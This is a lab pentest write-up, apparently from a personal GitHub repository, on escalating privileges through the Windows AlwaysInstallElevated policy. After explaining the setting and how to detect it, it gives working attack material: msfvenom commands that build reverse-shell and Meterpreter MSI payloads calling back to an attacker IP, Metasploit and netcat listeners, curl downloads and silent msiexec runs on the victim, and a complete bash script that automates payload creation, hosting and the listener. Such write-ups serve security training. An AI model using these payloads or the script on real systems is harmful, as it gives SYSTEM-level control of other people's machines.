<h1 align="center"> Windows Always Installed Elevated </h1>

<img width="1024" height="550" alt="Windows Always Installed Elevated" src="https://github.com/user-attachments/assets/68427e34-3b49-4b22-ae9f-85c03929454b" />



---

## Scope:

- **Attacker**: Kali Linus (IP `192.168.127.128`)
- **Victim**: Windows 10 (IP `192.168.127.148`)



---


## Table of Contents

[INTRODUCTION TO WINDOWS ALWAYS INSTALLED ELEVATED](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#introduction-to-windows-always-installed-elevated)

  - [Explain Windows Always Installed Elevated](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#explain-windows-always-installed-elevated)
  - [Understanding about Windows Installer (MSI)](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#understanding-about-windows-installer-msi)

[SETUP LAB](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#setup-lab)

  - [Configuration Check](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#configuration-check)
  - [Computer Configuration](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#computer-configuration)
  - [User Configuration](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#user-configuration)
  - [Check](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#check)


[WINDOWS ALWAYS INSTALL ELEVATED METHODOLOGY](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#windows-always-install-elevated-methodology)

  1. [Enumeration & Detection](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#1-enumeration--detection)
  2. [Create Malicious MSI Package](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#2-create-malicious-msi-package)

     - [Using msfvenom](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#1-using-msfvenom)
     - [Use Meterpreter payload](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#2-use-meterpreter-payload)
     - [Automate Script](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#3-automate-script)
    
  3. [Automate tools](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/13.%20Always_Installed_Elevated.md#3-automate-tools)



---



# INTRODUCTION TO WINDOWS ALWAYS INSTALLED ELEVATED


## Explain Windows Always Installed Elevated

### What is Windows Always Installed Elevated?


### What is AlwaysInstallElevated?
AlwaysInstallElevated is a Windows policy setting that allows **non-administrative users to install Microsoft Windows Installer packages (MSI files) with SYSTEM/Administrator privileges**.

### Windows Always Install with Elevated Privileges
- The `Always Install with Elevated Privileges` option is a policy setting that can allow users to install software with elevated permissions, even if not administrators.

- The problem is that arbitrary code can be executed during the installation of a software.

- Thus, this option represents a significant security risk, as it introduces the ability to execute arbitrary code with higher privileges.


### Why is it Dangerous?
When enabled, this setting effectively gives any user on the system the ability to run arbitrary code with elevated privileges, making it a critical privilege escalation vector.



## Understanding about Windows Installer (MSI)

### Windows Installer Basic:
- **MSI files**: Database files containing installation instructions
- **msiexec.exe**: The Windows Installer service executable
- **Installation Contexts**:
  - **Per-user**: Installed only for current user (limited privileges)
  - **Per-machine**: Installed for all users (requires elevation)


### Registry Keys Controlling Installation Context:
````
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
````
- Both must have **AlwaysInstallElevated** DWORD value set to 1 for the vulnerability to exist.


### How It Works
Windows has two registry settings that control MSI installation privileges:

1. HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
2. HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

When both are set to 1 (REG_DWORD), any user can run MSI installers with elevated privileges.


### Diagram Layout (Text-Based Blueprint):
````
+---------------------+
|   Low-Privilege     |
|      User           |
|  (e.g., "k4n0ng")   |
+----------+----------+
           |
           | Executes
           v
+---------------------+
|   Malicious MSI     |
|   (crafted by user) |
+----------+----------+
           |
           | Triggered via
           | msiexec /i evil.msi
           v
+-----------------------------+
| Windows Installer Service   |
| (runs as SYSTEM when        |
|  AlwaysInstallElevated=1)   |
+----------+------------------+
           |
           | Installs with
           | SYSTEM privileges
           v
+---------------------+
| Arbitrary Code      |
| Execution as SYSTEM |
| → Full Compromise   |
+---------------------+
````




---



# SETUP LAB


## Configuration Check

- To check if the **Always Install with Elevated Privileges** is enabled, you can either use Group Policy Editor (`gpedit.msc`).

- First press `Ctrl + R` -> Type `gpedit.msc` -> after `Right-Click` -> Click on `Run as administrator`:
<img width="782" height="678" alt="image" src="https://github.com/user-attachments/assets/8451f532-8302-4200-a8cd-2cd62cfe9575" />

<img width="452" height="457" alt="image" src="https://github.com/user-attachments/assets/37dde769-413e-4a6f-aaed-a6edb1b4069f" />

- Now we see this:
<img width="885" height="494" alt="image" src="https://github.com/user-attachments/assets/88748015-6d73-4111-8544-b74510417429" />



### **Computer Configuration** 

- **Computer Configuration**: `Computer Configuration` → `Administrative Templates` → `Windows Components` → `Windows Installer` → `Always install with elevated privileges`:
<img width="798" height="883" alt="image" src="https://github.com/user-attachments/assets/8d53fc29-8726-4ace-8131-4e5c5811e320" />

- After find `Windows Installer` -> `Always install Elevated with elevated privileges`:
<img width="1402" height="873" alt="image" src="https://github.com/user-attachments/assets/3286f286-a75b-4677-902d-329b91d11026" />

- After `Disabled` it:
<img width="1048" height="822" alt="image" src="https://github.com/user-attachments/assets/151ef4f9-46f2-43b8-9a7d-d936c6a2da56" />

<img width="687" height="635" alt="image" src="https://github.com/user-attachments/assets/054d1049-d6e9-491c-bd3d-47e698f24f0d" />

Now we see it `Disabled`:
<img width="882" height="796" alt="image" src="https://github.com/user-attachments/assets/86264ae9-ddf7-4cc4-90b2-d67d26f720c1" />


--- 


### **User Configuration**
- **Computer Configuration**: `User Configuration` → `Administrative Templates` → `Windows Components` → `Windows Installer` -> `Always install with elevated privileges` -> after `Disabled` it:
<img width="1292" height="877" alt="image" src="https://github.com/user-attachments/assets/bb70ec33-507d-462c-b731-eb323e86a606" />

- After find `Windows Installer` -> `Always install with elevated privileges`:
<img width="1527" height="886" alt="image" src="https://github.com/user-attachments/assets/56a237c2-41ba-4536-b2ce-1455c9a95edd" />

- After `Disabled` it -> `Right-Click` -> `Edit`:
<img width="1026" height="793" alt="image" src="https://github.com/user-attachments/assets/b52478de-b59d-4d0f-b461-88b70d379d61" />

<img width="685" height="633" alt="image" src="https://github.com/user-attachments/assets/853325ec-84b8-49fb-b6c2-4f3d7eb0a5ac" />

- After we see it `Disabled`:
<img width="868" height="796" alt="image" src="https://github.com/user-attachments/assets/d4a940b7-9aa9-489b-92cf-b82cf41447ff" />



### Check
- First run as normal user:
````
whoami /groups
````
<img width="1713" height="490" alt="image" src="https://github.com/user-attachments/assets/79fff7d8-a31a-4f46-947f-933d5dcaad70" />

- Now we see: `Mandatory Label\Medium Mandatory Level`.

- Second run as `Administrator`:
````
whoami /groups
````
<img width="1716" height="469" alt="image" src="https://github.com/user-attachments/assets/5cc2e763-4a86-4e27-bb93-8f563e10a6d5" />

- Now we see: `Mandatory Label\High Mandatory Level`.


#### Integrity Level in windows:
| Integrity Level | SID Value    | Typical Use Case                                                              |
| --------------- | ------------ | ----------------------------------------------------------------------------- |
| Low             | S-1-16-4096  | Sandboxed applications (e.g., Internet Explorer Protected Mode, Edge sandbox) |
| Medium          | S-1-16-8192  | Standard user processes (default for most applications)                       |
| High            | S-1-16-12288 | Elevated processes (Run as Administrator)                                     |
| System          | S-1-16-16384 | Core operating system processes and services running as SYSTEM                |



### Check Both Registry Keys

#### PowerShell Command (Computer Policy):
````
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
````
<img width="1446" height="260" alt="image" src="https://github.com/user-attachments/assets/0efca07e-bc5c-4d00-a792-6d40552d6783" />

- `Disabled (0)`: Safe. MSI files run with normal user rights unless explicitly elevated.
- `Enabled (1)`: Unsafe. Any MSI file could run with SYSTEM privileges, creating a serious security risk.

#### PowerShell Command (User Policy):
````
Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated 
````
<img width="1498" height="255" alt="image" src="https://github.com/user-attachments/assets/2a62dead-1a62-49fb-a2f9-69851ea12964" />

- In this we see `AlwaysInstallElevated : 0`.
- Or we can use this command:
- Check Computer Policy (HKLM)
````
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
````
- Check User Policy (HKCU)
````
Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
````


### Create/Modify the Registry Keys
Run these commands in an **elevated PowerShell window**:

#### Enable for Computer (HKLM)
````
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWord -Force
````
<img width="1853" height="267" alt="image" src="https://github.com/user-attachments/assets/309d0c0c-9fa4-49b0-a4c6-6b6a3ffbaa4e" />

- Now we see `AlwaysInstallElevated : 1`.

#### Enable for Current User (HKCU)
````
New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWord -Force
````
<img width="1866" height="273" alt="image" src="https://github.com/user-attachments/assets/5aace092-a7ad-4027-af5f-b4d78f8352a3" />


> Note: This we need to use it with Administrator.


### Verify

#### Check HKLM
````
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
````
<img width="1437" height="278" alt="image" src="https://github.com/user-attachments/assets/ed75db17-5ea9-439a-8f37-36a2c469dfc3" />


#### Check HKCU
````
Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
````
<img width="1430" height="237" alt="image" src="https://github.com/user-attachments/assets/d0146c00-635e-406f-9159-61c44bd8186b" />

- Now we all of it `AlwaysInstallElevated : 1`.


---






# WINDOWS ALWAYS INSTALL ELEVATED METHODOLOGY 


## 1. Enumeration & Detection 

### Check if AlwaysInstallElevated is Enabled

#### Using Command Prompt
##### Check current user setting
````
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
````
<img width="937" height="102" alt="image" src="https://github.com/user-attachments/assets/d8f07329-8dc8-4d3b-b69c-397878ee5f26" />

##### Check local machine setting  
````
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
````
<img width="955" height="107" alt="image" src="https://github.com/user-attachments/assets/de73da04-8caf-44d4-9706-cbed212b68e2" />



#### Using PowerShell

##### Check both settings
````
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
````
<img width="1749" height="242" alt="image" src="https://github.com/user-attachments/assets/56103169-25c3-467d-833d-bae9072a9036" />

````
Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
````
<img width="1759" height="255" alt="image" src="https://github.com/user-attachments/assets/efe1c8f9-6849-4a99-8b68-93a3713ba772" />

- Now we see: `AlwaysInstallElevated : 1`.

##### Alternative one-liner
````
if((Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1 -and (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1) { Write-Host "VULNERABLE" }
````
<img width="1884" height="163" alt="image" src="https://github.com/user-attachments/assets/f4826117-55f6-4837-8859-313808b72b35" />

- Now we see it `Vulnerable`.


---



## 2. Create Malicious MSI Package

### 1. Using msfvenom

#### Generate reverse shell MSI (On Kali)
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f msi -o shell.msi
````
<img width="1220" height="322" alt="image" src="https://github.com/user-attachments/assets/2f3bd3f3-055a-4334-b4ec-8f556df8fada" />

- Or if we use for `x86` systems:
````
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f msi -o shell32.msi
````
- But in this don't show demo.
- Or For `32-bit` Windows:
````
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f msi -o shell32.msi
````


##### Start the Metasploit Listener (On Kali)
````
msfconsole -q
````
````
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 192.168.127.128
set LPORT 4444
exploit
````
<img width="876" height="405" alt="image" src="https://github.com/user-attachments/assets/03728900-7117-427f-a3c1-2f90a2dbb1b5" />


- After I press new tab, press `Ctrl + Shift + T`.

##### Open Python HTTP server
````
python3 -m http.server 8000
````
<img width="644" height="156" alt="image" src="https://github.com/user-attachments/assets/f412e4e7-6658-4b7b-a84f-b0b4658fd8d7" />


- After on victim.

##### Deliver & Execute the MSI on the Victim:

- First go to `Browser` -> type `192.168.127.128:8000`:
<img width="1912" height="854" alt="image" src="https://github.com/user-attachments/assets/54109d1f-3e47-44e8-b2fe-a9dd02d0a836" />

- After click file `shell.msi`:
<img width="1911" height="856" alt="image" src="https://github.com/user-attachments/assets/53dbde86-c516-46e4-907d-14e0c27ffc8d" />

- Now we finished `Download` file.



##### After execute it:
- Go to our folder:
````
cd Downloads
ls
````
<img width="837" height="462" alt="image" src="https://github.com/user-attachments/assets/d9281984-0fa8-465b-8a31-229d34471db7" />

````
msiexec /quiet /qn /i shell.msi
````
<img width="711" height="157" alt="image" src="https://github.com/user-attachments/assets/590239b7-d7cf-452d-a08e-ed40eb4c4430" />

- After back to attacker.

##### On attacker:
<img width="1406" height="670" alt="image" src="https://github.com/user-attachments/assets/5c6d029b-bc8f-44fa-9e5f-9480aa2d72a3" />

- Now we got the victim `shell`, especially we got the victim `administrator`. And in this we execute on victim as ``normal``.

- We got `nt authority\system` because the exploit leveraged a **privilege escalation path** (likely AlwaysInstallElevated or another misconfiguration). Even though you started as a normal user, the vulnerable setting allowed your payload to run as SYSTEM.

---




### 2. Use Meterpreter payload:
#### Create meterpreter
````
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f msi -o meterpreter.msi
````
<img width="1367" height="318" alt="image" src="https://github.com/user-attachments/assets/23784b53-0269-47ed-9f10-f55f03a83ae7" />


#### Start the Metasploit Listener
````
msfconsole -q
````
````
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.127.128
set LPORT 4444
exploit
````
<img width="945" height="416" alt="image" src="https://github.com/user-attachments/assets/aaab8a02-d669-4706-b23f-6000e915af2a" />


#### On attacker Open python HTTP Server
````
python3 -m http.server 80
````
<img width="596" height="183" alt="image" src="https://github.com/user-attachments/assets/2e26abe3-7ac1-4f52-9d2d-d2028d860a41" />


#### Deliver & Execute the MSI on the Victim
Transfer the `.msi` to the Windows machine:
- On victim:
````
curl http://192.168.127.128/meterpreter.msi -o meterpreter.msi
ls
````
<img width="1032" height="505" alt="image" src="https://github.com/user-attachments/assets/06b10b47-9586-445c-b69e-828008c6cd10" />


#### Execute silently (no pop-ups):
On the Windows victim, open CMD or PowerShell as a standard user:
````
msiexec /quiet /qn /i meterpreter.msi
````
<img width="790" height="181" alt="image" src="https://github.com/user-attachments/assets/701aa592-ab59-4a02-ba38-7584a39f50e2" />

- `/quiet`: no UI
- `/qn`: no messages
- Runs **with elevated privileges** if the policy is enabled!


- After back to our attacker.

#### On attacker (Kali)
Verify & Escalate:
<img width="1361" height="484" alt="image" src="https://github.com/user-attachments/assets/d1fef698-a27a-4ab5-adea-d996460fbd43" />

- Now we got the victim `Meterpreter`.

````
sysinfo
getuid
````
<img width="711" height="300" alt="image" src="https://github.com/user-attachments/assets/89b8fb87-1767-40d8-91cd-342582c0fde9" />

- Now in this we see, we got `NT AUTHORITY\SYSTEM`.

````
screenshot
````
<img width="607" height="106" alt="image" src="https://github.com/user-attachments/assets/eec8f5d7-c24b-4ed4-a84b-693ea81d07ea" />

- After find our `Screenshot`:
````
firefox /home/k4n0ng/vQAaUStd.jpeg
````
<img width="964" height="786" alt="image" src="https://github.com/user-attachments/assets/2a555b0b-e176-48c2-b268-9fbad006a0f8" />

- Now we see the screenshot of target.


````
shell
````
<img width="627" height="251" alt="image" src="https://github.com/user-attachments/assets/8f7c59e1-ca19-44fa-b083-b29aa9a4fd34" />

- Now we got full of target.

---



### 3. Automate Script

#### Create payload:
````
nano msi_reverse_shell.sh
````
````
#!/bin/bash

# ┌───────────────────────────────────────────┐
# │  MSI Reverse Shell Generator (Netcat)     │
# │  For "Always Install Elevated" Exploit    │
# │  Author: k4n0ng (Lab Use Only)    │
# └───────────────────────────────────────────┘

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Get local IP (first non-loopback IPv4)
KALI_IP=$(hostname -I | awk '{print $1}')
if [[ -z "$KALI_IP" ]]; then
    echo -e "${RED}[-] Could not detect local IP. Exiting.${NC}"
    exit 1
fi

PORT=4444
MSI_NAME="update.msi"
SCRIPT_DIR="$(pwd)"

# Banner
echo -e "${BLUE}
  ██████╗██╗   ██╗███████╗████████╗ ██████╗ ███╗   ██╗
 ██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║
 ██║     ██║   ██║███████╗   ██║   ██║   ██║██╔██╗ ██║
 ██║     ██║   ██║╚════██║   ██║   ██║   ██║██║╚██╗██║
 ╚██████╗╚██████╔╝███████║   ██║   ╚██████╔╝██║ ╚████║
  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
${NC}"
echo -e "${YELLOW}[!] For authorized penetration testing or lab use only.${NC}\n"

# Confirm
echo -e "${GREEN}[+] Detected Kali IP: ${KALI_IP}${NC}"
echo -e "${GREEN}[+] Payload: windows/shell_reverse_tcp${NC}"
echo -e "${GREEN}[+] Port: ${PORT}${NC}"
echo -e "${GREEN}[+] Output: ${MSI_NAME}${NC}\n"

read -p "Press ENTER to generate payload and start services..."

# Generate MSI with msfvenom
echo -e "\n${BLUE}[*] Generating ${MSI_NAME}...${NC}"
msfvenom -p windows/shell_reverse_tcp LHOST="$KALI_IP" LPORT="$PORT" -f msi -o "$MSI_NAME" 2>/dev/null

if [[ ! -f "$MSI_NAME" ]]; then
    echo -e "${RED}[-] Failed to generate ${MSI_NAME}. Is msfvenom installed?${NC}"
    exit 1
fi

echo -e "${GREEN}[+] ${MSI_NAME} created successfully!${NC}"

# Start HTTP server in background
echo -e "${BLUE}[*] Starting HTTP server on port 80...${NC}"
sudo python3 -m http.server 80 > /tmp/http_server.log 2>&1 &
HTTP_PID=$!

# Wait a sec for server to start
sleep 2

# Check if server is running
if ! sudo lsof -i :80 > /dev/null 2>&1; then
    echo -e "${RED}[-] Failed to start HTTP server (port 80 may be in use).${NC}"
    kill $HTTP_PID 2>/dev/null
    exit 1
fi

echo -e "${GREEN}[+] HTTP server running: http://${KALI_IP}/${MSI_NAME}${NC}"

# Start Netcat listener
echo -e "\n${YELLOW}===============================================${NC}"
echo -e "${GREEN}[+] INSTRUCTIONS FOR VICTIM (Windows):${NC}"
echo -e "${GREEN}1. Open Command Prompt or PowerShell${NC}"
echo -e "${GREEN}2. Run:${NC}"
echo -e "${YELLOW}   curl http://${KALI_IP}/${MSI_NAME} -o ${MSI_NAME}${NC}"
echo -e "${GREEN}   OR (PowerShell):${NC}"
echo -e "${YELLOW}   Invoke-WebRequest -Uri \"http://${KALI_IP}/${MSI_NAME}\" -OutFile \"${MSI_NAME}\"${NC}"
echo -e "${GREEN}3. Execute silently:${NC}"
echo -e "${YELLOW}   msiexec /quiet /qn /i ${MSI_NAME}${NC}"
echo -e "${YELLOW}===============================================${NC}"
echo -e "\n${BLUE}[*] Waiting for reverse shell on port ${PORT}...${NC}"
echo -e "${RED}[!] Press CTRL+C to stop listener and clean up.${NC}\n"

# Start Netcat
nc -nvlp "$PORT"

# Cleanup on exit (if interrupted)
cleanup() {
    echo -e "\n${BLUE}[*] Cleaning up...${NC}"
    kill $HTTP_PID 2>/dev/null
    rm -f "$MSI_NAME"
    rm -f /tmp/http_server.log
    echo -e "${GREEN}[+] Done.${NC}"
    exit 0
}

trap cleanup INT TERM

# Keep alive (in case nc exits normally)
wait
````
<img width="1919" height="900" alt="image" src="https://github.com/user-attachments/assets/9cd1de83-0b9c-4756-a2ec-57939100a64f" />

- To save it press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

#### Make it executable
````
chmod +x msi_reverse_shell.sh
````
<img width="765" height="169" alt="image" src="https://github.com/user-attachments/assets/6f5b7363-5f2a-42a8-b644-a7aab9f2c13f" />


#### Run it
````
./msi_reverse_shell.sh
````
<img width="893" height="852" alt="image" src="https://github.com/user-attachments/assets/30220b3b-46ec-4ff5-b8e1-92494b4c68d5" />

- After on target.

#### On Victim:
````
curl http://192.168.127.128/update.msi -o update.msi
Invoke-WebRequest -Uri "http://192.168.127.128/update.msi" -OutFile "update.msi"
msiexec /quiet /qn /i update.msi
````
<img width="1275" height="234" alt="image" src="https://github.com/user-attachments/assets/798358b6-7fd3-4f5e-bd00-e042bc95dd21" />

- After back to attacker.

#### On attacker:
<img width="875" height="517" alt="image" src="https://github.com/user-attachments/assets/3d2d4cc3-ab8c-4d01-b121-288d29ccc0e8" />

- Now we got successful to get target `shell`.

---



## 3. Automate tools

- In this I yused my tools that i was builded: https://github.com/Nin-Kanong/MSI-Exploit-k4
<img width="1919" height="861" alt="image" src="https://github.com/user-attachments/assets/07901b88-238b-40d3-9977-a0ec79643cbd" />

### Installation Tool
````
git clone https://github.com/Nin-Kanong/MSI-Exploit-k4.git
````
<img width="1203" height="490" alt="image" src="https://github.com/user-attachments/assets/8e934c43-2ffe-4273-9970-07fbab7b7b3d" />

````
cd MSI-Exploit-k4
chmod +x setup.sh msi_exploit.py
````
<img width="1273" height="212" alt="image" src="https://github.com/user-attachments/assets/c9b7f20b-3fa6-43b9-a910-0f496db4d933" />


- If we not yet setup:
````
./setup.sh
````
- But in this I already setup it.


````
python3 ./msi_exploit.py --help
````
<img width="1755" height="443" alt="image" src="https://github.com/user-attachments/assets/42bc699e-5c3b-420e-b9de-36dc278b95ba" />


### Run script:
````
python3 ./msi_exploit.py
````
<img width="1026" height="666" alt="image" src="https://github.com/user-attachments/assets/da5a25a5-f969-4951-b661-dde210c26167" />



### On Victim:
````
curl http://192.168.127.128/update.msi -o update.msi
msiexec /quiet /qn /i update.msi
````
<img width="902" height="183" alt="image" src="https://github.com/user-attachments/assets/fbaf7846-43ff-49d3-9a5d-8280333208a2" />

- In this it auto detect **IP**.

- After back to attack.

### On attacker
<img width="1005" height="807" alt="image" src="https://github.com/user-attachments/assets/69e6e95b-fa5f-43d8-86a5-cb0f78b1389e" />

- Now we got the target `shell` and  also we got `administrator`.

````
net user raaz
````
<img width="562" height="570" alt="image" src="https://github.com/user-attachments/assets/49935c25-98e3-4fff-b07c-bd292a474b4c" />


---


### In real world 
- Like when we got the victim `shell` but we don't get privilege Escalate or authorised on the system.
<img width="720" height="300" alt="image" src="https://github.com/user-attachments/assets/a5425127-a3fb-452d-9f55-e3d6d2a76507" />

- Now in this se got only normal user `desktop-pnitag8\k4n0ng`:


#### After we use Tools for Priv Esc:
````
python3 ./msi_exploit.py
````
<img width="1274" height="790" alt="image" src="https://github.com/user-attachments/assets/77d836c7-f538-4fcc-8351-77b8d4259eaa" />


- After on our the victim ``shell``:
````
curl http://192.168.127.128/update.msi -o update.msi
msiexec /quiet /qn /i update.msi
````
<img width="793" height="419" alt="image" src="https://github.com/user-attachments/assets/b35da49a-97bd-404e-82be-7ef05398025b" />

- Now I was download the attacker ``payload``.

- After back to attacker shell:
<img width="1007" height="815" alt="image" src="https://github.com/user-attachments/assets/d6bc2f93-38cb-4a88-86b4-b8ebd980cbf9" />


- Now we got the victim `nt authority\system`.


----


<h2 align="center"> Completed - Always Installed Elecated </h2>


<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>
